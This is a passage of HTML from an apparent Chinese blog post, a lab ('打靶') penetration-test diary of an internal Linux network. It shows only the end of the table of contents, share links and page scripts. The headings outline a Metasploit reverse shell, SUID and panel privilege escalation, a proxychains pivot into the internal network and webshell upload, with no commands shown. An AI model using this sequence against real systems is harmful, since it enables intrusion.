disable_functions 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-metasploit-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">5.2.</span> <span class="toc-text">4.2.metasploit 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">5.2.1.</span> <span class="toc-text">4.2.1.生成攻击载荷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">5.2.2.</span> <span class="toc-text">4.2.2监听端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-3%E6%88%90%E5%8A%9F%E7%9B%91%E5%90%AC-shell"><span class="toc-number">5.2.3.</span> <span class="toc-text">4.2.3成功监听 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3%E5%BB%BA%E7%AB%8B%E4%BA%A4%E4%BA%92shell"><span class="toc-number">5.3.</span> <span class="toc-text">4.3建立交互shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7"><span class="toc-number">5.4.</span> <span class="toc-text">4.4查看用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5%E8%8E%B7%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AAflag"><span class="toc-number">5.5.</span> <span class="toc-text">4.5获取第一个flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6%E9%80%9A%E8%BF%87%E5%AE%9D%E5%A1%94%E6%8F%90%E6%9D%83%E5%88%B0root"><span class="toc-number">5.6.</span> <span class="toc-text">4.6通过宝塔提权到root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6%E9%80%9A%E8%BF%87-suid-%E6%8F%90%E6%9D%83%E5%88%B0-root"><span class="toc-number">5.7.</span> <span class="toc-text">4.6通过 suid 提权到 root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-linux-%E4%B8%89%E5%A4%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E8%A7%A3%E9%87%8A"><span class="toc-number">5.8.</span> <span class="toc-text">4.8.linux 三大信息收集脚本的使用和解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-1-LinEnum-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.8.1.</span> <span class="toc-text">4.8.1.LinEnum 的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-2-linux-exploit-suggester-sh%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">5.8.2.</span> <span class="toc-text">4.8.2.linux-exploit-suggester.sh的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8-3-linuxprivchecker-py"><span class="toc-number">5.8.3.</span> <span class="toc-text">4.8.3.linuxprivchecker.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10%E8%8E%B7%E5%8F%96%E7%AC%AC%E4%BA%8C%E4%B8%AAflage"><span class="toc-number">5.9.</span> <span class="toc-text">4.10获取第二个flage</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-linux-%E5%86%85%E7%BD%91%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">5. linux 内网跨网段渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-1-%E8%8E%B7%E5%8F%96%E9%AB%98%E6%9D%83%E9%99%90%E7%9A%84-meterpreter"><span class="toc-number">7.</span> <span class="toc-text">5.1.获取高权限的 meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2%E7%BD%91%E5%8D%A1%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">7.1.</span> <span class="toc-text">5.2网卡路由信息获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3%E6%9F%A5%E7%9C%8B-host-%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.</span> <span class="toc-text">5.3查看 host 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4metasploit-%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91"><span class="toc-number">7.3.</span> <span class="toc-text">5.4metasploit 设置代理进入内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-1%E5%90%AF%E5%8A%A8-socks-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.3.1.</span> <span class="toc-text">5.4.1启动 socks 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-2%E8%AE%BE%E7%BD%AE-proxychains-%E4%BB%A3%E7%90%86%E8%BF%9B%E5%86%85%E7%BD%91"><span class="toc-number">7.3.2.</span> <span class="toc-text">5.4.2设置 proxychains 代理进内网</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5%E5%AF%B9-www-ddd5-com-%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B"><span class="toc-number">7.4.</span> <span class="toc-text">5.5对 www.ddd5.com 进行检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-1-%E8%AE%BE%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE"><span class="toc-number">7.4.1.</span> <span class="toc-text">5.5.1.设置浏览器代理访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-2%E5%90%8E%E5%8F%B0%E6%8B%BF-WEBSHELL"><span class="toc-number">7.4.2.</span> <span class="toc-text">5.5.2后台拿 WEBSHELL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-linux-%E5%86%85%E7%BD%91%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">6.linux 内网跨网段提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1wdcp%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83"><span class="toc-number">8.1.</span> <span class="toc-text">6.1wdcp主机提权</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&text=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&is_video=false&description=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=打靶日记（二）linux内网完整渗透测试&body=Check out this article: https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&title=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&name=打靶日记（二）linux内网完整渗透测试&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/&t=打靶日记（二）linux内网完整渗透测试"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
